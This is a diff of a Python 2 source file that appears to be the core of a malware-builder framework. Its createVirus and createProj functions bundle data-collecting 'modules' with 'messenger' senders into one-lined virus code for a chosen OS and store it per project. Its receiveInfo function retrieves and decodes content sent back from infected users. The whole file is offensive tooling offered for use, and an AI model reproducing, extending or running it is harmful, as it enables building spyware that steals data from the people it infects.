@@ -1,23 +1,33 @@
 #-*- coding:utf-8 -*-
 
+#Importing libs
 import re, os, sys, ast, random, base64, time, json
 import astunparse
-from onelinerizer import onelinerize
+from lib.ol.main import onelinerize
 
+#Importing terminaltables
 try: 
     import terminaltables
 except:
     print "Oops"
+
+#Constants
 ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
 ignoreEnds = ["pyc"]
-supportedOS = ["Windows", "Darwin", "*"]
-
+supportedOS = ["Windows", "Darwin", "Linux"]
+dataLoc = "db/data.json"
 
 class utils():
     @staticmethod
-    def checkFile(fileLines, sender = False):
-        _regex = "__%s__.*?=.*?\"(.*?)\""
-        _sys = re.compile(_regex % "sys")
+    def convertSupportedOS(supportedOS):
+        supportedOS = supportedOS.replace(" ", "")\
+            .replace('"', '')
+        return supportedOS.split(",")
+
+    @classmethod
+    def checkFile(cls, fileLines, sender = False):
+        _regex = "__%s__.*?=.*?(\'|\")(.*?)(\'|\")"
+        _sys = re.compile("__%s__.*?=.*?\[(.*?)\]" % "sys")
         _name = re.compile(_regex % "name")
         _desc = re.compile(_regex % "desc")
         resultTemp = {
@@ -36,20 +46,20 @@ class utils():
                 if not resultTemp["sys"]:
                     lineSys = _sys.findall(i[1])
                     if lineSys:
-                        resultTemp["sys"] = lineSys[0]
+                        resultTemp["sys"] = cls.convertSupportedOS(lineSys[0])
                         continue
                 if not resultTemp["name"]:
                     lineName = _name.findall(i[1])
                     if lineName:
-                        resultTemp["name"] = lineName[0]
+                        resultTemp["name"] = lineName[0][1]
                         continue
                 if not resultTemp["desc"]:
                     lineDesc = _desc.findall(i[1])
                     if lineDesc:
-                        resultTemp["desc"] = lineDesc[0]
+                        resultTemp["desc"] = lineDesc[0][1]
                         continue
             else:
-                trivialResult = utils.checkFile(i[1].split(";"))
+                trivialResult = cls.checkFile(i[1].split(";"))
                 for j in trivialResult:
                     if not resultTemp[j] and trivialResult[j]:
                         resultTemp[j] = trivialResult[j]
@@ -57,10 +67,11 @@ class utils():
 
     @staticmethod
     def checkContent(info, file):
-        if info["sys"] not in supportedOS:
-            info["success"] = 1
-            info["info"] = "OS not Supported"
-            print "[!] OS not Supported for file %s" % file
+        for i in info["sys"]:
+            if i not in supportedOS:
+                info["success"] = 1
+                info["info"] = "OS not Supported"
+                print "[!] OS %s not Supported for file %s" % (i, file)
         for k in info:
             if not info[k] and k in ["sys", "name", "desc"]:
                 info["success"] = 2
@@ -90,12 +101,10 @@ class utils():
                             exec(sendCode)
                             info["sendCode"] = sendCode
                             info["sendCodeFunc"] = funcName
-
                 except:
                     info["success"] = 4
                     info["info"] = "Error"
                     print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
-
             if info["sendCode"] == "":
                 info["success"] = 5
                 info["info"] = "No Send Func"
@@ -106,10 +115,10 @@ class utils():
             print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
         return info
 
-    @staticmethod
-    def checkModule(info, file):
-        return utils.checkContent(
-            utils.checkModuleInt(info, file), 
+    @classmethod
+    def checkModule(cls, info, file):
+        return cls.checkContent(
+            cls.checkModuleInt(info, file), 
             file)
 
     @staticmethod
@@ -142,12 +151,10 @@ class utils():
                     info["success"] = 4
                     info["info"] = "Error"
                     print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
-
             if info["sendCode"] == "":
                 info["success"] = 5
                 info["info"] = "No Send Func"
                 print "[!] No 'send' function in file %s" % file
-
             if info["receiveCode"] == "":
                 info["success"] = 5
                 info["info"] = "No Receive Func"
@@ -158,20 +165,25 @@ class utils():
             print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
         return info
 
-    @staticmethod
-    def checkSend(info, file):
-        return utils.checkContent(
-            utils.checkSendInt(info, file), 
+    @classmethod
+    def checkSend(cls, info, file):
+        return cls.checkContent(
+            cls.checkSendInt(info, file), 
             file)
 
     @staticmethod
-    def checkAva(module, info):
+    def checkAva(module, info, platform):
         moduleNames = [x["name"] for x in info]
         if module in moduleNames:
             for i in info:
                 if i["name"] == module:
                     if i["success"] == 0:
-                        return True
+                        if platform in i["sys"]:
+                            return True 
+                        else:
+                            print "[!] Module %s is not supporting %s, ignored" % (
+                         	module, platform)
+                            return False
                     else:
                         print "[!] Module %s is not available, ignored" % module
                         return False
@@ -181,10 +193,10 @@ class utils():
     @staticmethod
     def visitJSON():
         try:
-            data = json.loads(open("data.json").read())
+            data = json.loads(open(dataLoc).read())
             return data
         except Exception as e:
-            print "[x] Error in data.json"
+            print "[x] Error in %s" % dataLoc
             raise e
 
 class API():
@@ -218,22 +230,22 @@ class API():
                         ))
         return sendInfo
 
-    @staticmethod
-    def createVirus(moduleList, sendList, 
-        projName,
+    @classmethod
+    def createVirus(cls, moduleList, sendList, 
+        projName, platform = 'Darwin',
         sendPath = 'messenger',
         modulePath = "module"):
-        moduleInfo = API.getModuleInfo(modulePath)
-        sendInfo = API.getSendInfo(sendPath)
+        moduleInfo = cls.getModuleInfo(modulePath)
+        sendInfo = cls.getSendInfo(sendPath)
         realModuleList = []
         realSendList = []
         for send in enumerate(sendList):
-            if utils.checkAva(send[1], sendInfo):
+            if utils.checkAva(send[1], sendInfo, platform):
                 for i in sendInfo:
                     if i["name"] == send[1]:
                         realSendList.append(i)
         for module in enumerate(moduleList):
-            if utils.checkAva(module[1], moduleInfo):
+            if utils.checkAva(module[1], moduleInfo, platform):
                 for i in moduleInfo:
                     if i["name"] == module[1]:
                         realModuleList.append(i)
@@ -249,17 +261,16 @@ class API():
                 execCode += "%s(%s(), '%s', '%s');" % (
                     j["sendCodeFunc"], i["sendCodeFunc"], 
                     i["name"], projName)
-
         return moduleCode + sendCode + execCode
 
-    @staticmethod
-    def createReceive(sendList,
-        projName, 
+    @classmethod
+    def createReceive(cls, sendList,
+        projName, platform = 'Darwin',
         sendPath = 'messenger'):
-        sendInfo = API.getSendInfo(sendPath)
+        sendInfo = cls.getSendInfo(sendPath)
         realSendList = []
         for send in enumerate(sendList):
-            if utils.checkAva(send[1], sendInfo):
+            if utils.checkAva(send[1], sendInfo, platform):
                 for i in sendInfo:
                     if i["name"] == send[1]:
                         realSendList.append(i)
@@ -272,12 +283,11 @@ class API():
             execCode += "receiveObj = %s(@knicky.RANGE, '%s');" % (
                     j["receiveCodeFunc"], projName
                 )
-
         return receiveCode + execCode
 
-    @staticmethod
-    def createProj( 
-        moduleList, sendList, 
+    @classmethod
+    def createProj(cls, 
+        moduleList, sendList, platform = 'Darwin',
         projName = str(base64.b64encode(str(time.time() + 
             random.randint(0,20000)))).replace("=", ""),
         sendPath = 'messenger',
@@ -285,9 +295,9 @@ class API():
         print "[*] The project name is %s" % projName
         data = utils.visitJSON()
         projects = data["projects"]
-        virusCode = API.createVirus(moduleList, sendList, projName,
+        virusCode = cls.createVirus(moduleList, sendList, projName, platform, 
             sendPath, modulePath)
-        receiveCode = API.createReceive(sendList, projName, sendPath)
+        receiveCode = cls.createReceive(sendList, projName, platform, sendPath)
         projects.append({
             "projName" : projName,
             "virusCode" : base64.b64encode(virusCode),
@@ -295,7 +305,7 @@ class API():
             "time" : time.time()
         })
         data["projects"] = projects
-        with open("data.json", "w") as file:
+        with open(dataLoc, "w") as file:
             json.dump(data, file)
         print "[*] Success!!"
         return virusCode
@@ -312,12 +322,27 @@ class API():
         return result
 
     @staticmethod
-    def receiveInfo(projName, _range = 10):
+    def getReceiveCode(projName):
         data = utils.visitJSON()
         receiveCode = ""
         for i in data["projects"]:
             if i["projName"] == projName:
                 receiveCode = base64.b64decode(i["receiveCode"])
+        return receiveCode
+
+    @staticmethod
+    def getVirusCode(projName):
+        data = utils.visitJSON()
+        virusCode = ""
+        for i in data["projects"]:
+            if i["projName"] == projName:
+                virusCode = base64.b64decode(i["virusCode"])
+        return virusCode
+
+    @classmethod
+    def receiveInfo(cls, projName, _range = 10):
+        data = utils.visitJSON()
+        receiveCode = cls.getReceiveCode(projName)
         if receiveCode == "":
             print "[x] Your entered wrong project name"
             return []
@@ -326,24 +351,26 @@ class API():
                 .replace("@knicky.RANGE", str(_range)))
             return receiveObj
 
+
 class beautify():
-    @staticmethod
-    def getTime(timestamp):
+    @classmethod
+    def getTime(cls, timestamp):
         return time.strftime("%Y-%m-%d %H:%M:%S", 
                     time.localtime(float(timestamp)))
-    @staticmethod
-    def b64(_str):
+
+    @classmethod
+    def b64(cls, _str):
         return base64.b64decode(_str)
-        
-    @staticmethod
-    def tm(result):
+
+    @classmethod
+    def tm(cls, result):
         try:
             return terminaltables.AsciiTable(result).table
         except Exception as e:
             print "Error in terminaltables %s" % e
 
-    @staticmethod
-    def bM(info):
+    @classmethod
+    def bM(cls, info):
         result = [["Name", "Description", "SupportedOS", "Status"]]
         for i in info:
             if i["success"] == 0:
@@ -352,40 +379,40 @@ class beautify():
                 result.append(
                     [i["name"], i["desc"], i["sys"], "Failed"]
                 )
-        return beautify.tm(result)
-    
-    @staticmethod
-    def bC(info):
+        return cls.tm(result)
+
+    @classmethod
+    def bC(cls, info):
         result = [["Name", "Time"]]
         for i in info:
-            result.append([i["name"], beautify.getTime(i["time"])])
-        return beautify.tm(result)
-    
-    @staticmethod
-    def bR(info):
+            result.append([i["name"], cls.getTime(i["time"])])
+        return cls.tm(result)
+
+    @classmethod
+    def bR(cls, info):
         result = [["Module", "From User", "Date", "Content"]]
         for i in info:
             result.append([i["_byModule"], i["_from"], 
-                beautify.getTime(i["_date"]), 
-                beautify.b64(i["_content"])])
-        return beautify.tm(result)
+                cls.getTime(i["_date"]), 
+                cls.b64(i["_content"])])
+        return cls.tm(result)
 
-    @staticmethod
-    def getModuleInfo(path='module'):
+    @classmethod
+    def getModuleInfo(cls, path='module'):
         info = API.getModuleInfo(path)
-        return beautify.bM(info)
+        return cls.bM(info)
 
-    @staticmethod
-    def getSendInfo(path='messenger'):
+    @classmethod
+    def getSendInfo(cls, path='messenger'):
         info = API.getModuleInfo(path)
-        return beautify.bM(info)
+        return cls.bM(info)
 
-    @staticmethod
-    def listProj():
+    @classmethod
+    def listProj(cls):
         info = API.listProj()
-        return beautify.bC(info)
+        return cls.bC(info)
 
-    @staticmethod
-    def receiveInfo(projName, _range = 10):
+    @classmethod
+    def receiveInfo(cls, projName, _range = 10):
         info = API.receiveInfo(projName, _range)
-        return beautify.bR(info)\
+        return cls.bR(info)
